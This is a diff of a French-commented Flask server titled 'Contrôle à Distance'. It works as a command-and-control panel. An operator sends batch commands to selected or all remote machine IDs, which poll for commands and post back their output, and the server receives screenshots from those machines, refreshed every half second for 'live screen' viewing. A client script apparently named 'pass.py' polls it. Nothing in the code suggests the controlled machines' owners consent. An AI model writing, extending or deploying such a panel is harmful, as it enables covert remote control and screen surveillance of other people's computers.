@@ -1,46 +1,74 @@
-from flask import Flask, request, render_template_string, send_file
+from flask import Flask, request, render_template_string, send_file, redirect, url_for
 
 app = Flask(__name__)
 
+# État global
 commande = ""
 resultat_commande = ""
 destinataires = ""
+mode = "cmd"        # "cmd" ou "live"
+last_host = ""      # hostname du dernier screenshot reçu
 
-html_formulaire = """
+# Template HTML
+html_page = """
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
   <title>Console & Live Screen</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    form { margin-bottom: 15px; }
+    #screen { max-width:90vw; border:1px solid #ccc; }
+    .section { margin-top: 30px; }
+  </style>
 </head>
 <body>
-  <h2>Entrer une commande Batch</h2>
-  <form action="/" method="POST">
-    <input type="text" name="commande" placeholder="Commande batch">
-    <br>
-    <label>Destinataires (* = tous, !ID pour exclure) :</label>
-    <input type="text" name="destinataires" placeholder="* ou ID1,ID2,...">
-    <button type="submit">Envoyer</button>
-  </form>
+  <h1>🖥️ Contrôle à Distance</h1>
 
-  <form action="/clear_output" method="POST" style="margin-top: 20px;">
-    <button type="submit">Clear Outputs</button>
-  </form>
+  <!-- Section Commande -->
+  <div class="section">
+    <h2>Envoyer une commande batch</h2>
+    <form action="/" method="POST">
+      <input type="text" name="commande" value="{{ commande }}" placeholder="Commande batch" size="50">
+      <br><br>
+      <label>Destinataires (* = tous, !ID pour exclure) :</label>
+      <input type="text" name="destinataires" value="{{ destinataires }}" placeholder="* ou ID1,ID2,...">
+      <button type="submit">Envoyer</button>
+    </form>
+    <form action="/clear_output" method="POST">
+      <button type="submit">Effacer les résultats</button>
+    </form>
+    <p><strong>Dernière commande :</strong> {{ commande or "(aucune)" }}</p>
+    <p><strong>Destinataires :</strong> {{ destinataires or "(aucun)" }}</p>
+    <h3>Résultat de la commande :</h3>
+    <pre>{{ resultat_commande or "(vide)" }}</pre>
+  </div>
 
-  <p>Dernière commande : {{ commande }}</p>
-  <p>Destinataires : {{ destinataires }}</p>
+  <!-- Section Mode -->
+  <div class="section">
+    <h2>Mode Live Screen</h2>
+    <p><strong>Mode actuel :</strong> {{ mode }}</p>
+    <form action="/set_mode" method="POST" style="display:inline">
+      <button type="submit" name="mode" value="live">🔴 Live</button>
+    </form>
+    <form action="/set_mode" method="POST" style="display:inline">
+      <button type="submit" name="mode" value="cmd">⚪ Commande</button>
+    </form>
+  </div>
 
-  <h3>Résultat de la commande :</h3>
-  <pre>{{ resultat_commande }}</pre>
-
-  <h3>Live Screen</h3>
-  <img id="screen" src="/screen.png" style="max-width:90vw; border:1px solid #ccc;">
-  <script>
-    // Recharge l’image toutes les 2 s pour bypasser le cache
-    setInterval(function(){
-      document.getElementById('screen').src = '/screen.png?' + Date.now();
-    }, 2000);
-  </script>
+  <!-- Section Live Screen -->
+  <div class="section">
+    <h2>Live Screen</h2>
+    <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
+    <img id="screen" src="/screen.png" alt="Live screen">
+    <script>
+      // recharge l’image toutes les 0.5s pour du live plus fluide
+      setInterval(function(){
+        document.getElementById('screen').src = '/screen.png?' + Date.now();
+      }, 500);
+    </script>
+  </div>
 </body>
 </html>
 """
@@ -52,10 +80,12 @@ def index():
         commande = request.form.get("commande", "").strip()
         destinataires = request.form.get("destinataires", "").strip()
     return render_template_string(
-        html_formulaire,
+        html_page,
         commande=commande,
         destinataires=destinataires,
-        resultat_commande=resultat_commande
+        resultat_commande=resultat_commande,
+        mode=mode,
+        last_host=last_host
     )
 
 @app.route("/get_commande")
@@ -69,14 +99,11 @@ def get_commande():
         return commande
     elif destinataires.startswith("!"):
         excl = [i.strip() for i in destinataires[1:].split(",")]
-        if mid not in excl:
-            return commande
+        return commande if mid not in excl else ""
     else:
         incl = [i.strip() for i in destinataires.split(",")]
-        if mid in incl:
-            return commande
-    return ""
-
+        return commande if mid in incl else ""
+    
 @app.route("/post_resultat", methods=["POST"])
 def post_resultat():
     global resultat_commande
@@ -89,19 +116,33 @@ def post_resultat():
 def clear_output():
     global resultat_commande
     resultat_commande = ""
-    return "Cleared", 200
+    return redirect(url_for("index"))
 
-# --- Nouveau endpoint pour recevoir le screenshot ---
+@app.route("/set_mode", methods=["POST"])
+def set_mode():
+    global mode
+    m = request.form.get("mode", "")
+    if m in ("live", "cmd"):
+        mode = m
+    return redirect(url_for("index"))
+
+@app.route("/get_mode")
+def get_mode():
+    # pour pass.py
+    return mode
+
 @app.route("/post_screen", methods=["POST"])
 def post_screen():
+    global last_host
     f = request.files.get("screen")
-    if not f:
-        return "No file", 400
-    # on écrase à chaque fois : latest.png
+    mid = request.form.get("id", "").strip()
+    if not f or not mid:
+        return "Bad Request", 400
+    # on garde toujours latest.png pour l'affichage
     f.save("latest.png")
+    last_host = mid
     return "Screenshot reçu", 200
 
-# --- Sert l’image courante ---
 @app.route("/screen.png")
 def screen_png():
     try:
